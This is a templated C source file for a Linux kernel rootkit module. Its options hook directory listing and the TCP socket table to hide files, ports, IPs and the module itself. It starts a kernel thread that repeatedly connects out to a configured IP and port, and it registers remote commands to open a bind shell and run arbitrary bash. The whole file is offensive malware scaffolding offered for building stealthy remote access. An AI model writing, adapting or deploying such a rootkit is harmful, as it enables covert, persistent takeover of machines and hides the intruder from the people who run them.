#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/delay.h>

#include <linux/kthread.h>
#include <linux/wait.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("default");
MODULE_DESCRIPTION("module");
MODULE_VERSION("0.01");

{% if connector %}
#include "connector.h"
#include "mods/bindshell.h"
{% endif %}

{% if hide_dent or connector %}
#include "hooker/getdents.h"
#include "mods/hidedent.h"
{% endif %}

{% if hide_port or hide_ip or connector %}
#include "hooker/tcp_seq_show.h"
#include "mods/hideport.h"
#include "mods/hideip.h"
{% endif %}

{% if hide_me or connector %}
#include "mods/hideme.h"
{% endif %}

{% if shells or connector %}
#include "mods/runshell.h"
{% endif %}

void init_rootkit(void) {

    {% if hide_dent or connector %}
    install_getdents_hook();
    {% endif %}
    {% if hide_port or hide_ip or connector %}
    install_tcp_seq_show_hook();
    {% endif %}
    {% if hideme %}
    hideme("");
    {% endif %}
    {% if connector %}
    add_function("HIDEME", hideme);
    add_function("SHOWME", showme);
    add_function("HIDE_DENT", hide_dent);
    add_function("SHOW_HIDDEN_DENT", show_hidden_dent);
    add_function("HIDE_PORT", hide_port);
    add_function("SHOW_HIDDEN_PORT", show_hidden_port);
    add_function("HIDE_IP", hide_ip);
    add_function("SHOW_HIDDEN_IP", show_hidden_ip);
    add_function("BINDSHELL_CREATE", bindshell_create);
    add_function("RUN_CUSTOM_BASH", run_custom_bash);
    {% endif %}


    {% for dent in hide_dent %}
    hide_dent("{{dent}}");
    {% endfor %}
    {% for port in hide_port %}
    hide_port("{{port}}");
    {% endfor %}
    {% for ip in hide_ip %}
    hide_ip("{{ip}}");
    {% endfor %}
    {% for shell in shells %}
    run_custom_bash("{{shell}}");
    {% endfor %}

}

void clear_rootkit(void) {
    {% if hide_dent or connector %}
    remove_getdents_hook();
    {% endif %}
    {% if hide_port or hide_ip or connector %}
    remove_tcp_seq_show_hook();
    {% endif %}
    {% if connector %}
    clear_functions();
    {% endif %}
}

{% if connector %}
DECLARE_WAIT_QUEUE_HEAD(runner_wait_queue);

struct task_struct *runner_task = NULL;
int runner(void *ptr) {
    DECLARE_WAITQUEUE(wq, current);
    add_wait_queue(&runner_wait_queue, &wq);
    while (!kthread_should_stop()) {
        connector("{{ connector.ip }}", {{connector.port}});
        msleep(1000);
    }
    set_current_state(TASK_RUNNING);
    remove_wait_queue(&runner_wait_queue, &wq);
    return 0;
}
{% endif %}

static int __init rootkit_example_init(void) {
    init_rootkit();

    {% if connector %}
    runner_task = kthread_run(runner, NULL, "kthread_module");
    if (runner_task) {
        get_task_struct(runner_task);
        msleep(1000);
        wake_up(&runner_wait_queue);
    }
    {% endif %}
    return 0;
}

static void __exit rootkit_example_exit(void) {
    {% if connector %}
    kthread_stop(runner_task);
    {% endif %}
    clear_rootkit();
}

module_init(rootkit_example_init);
module_exit(rootkit_example_exit);
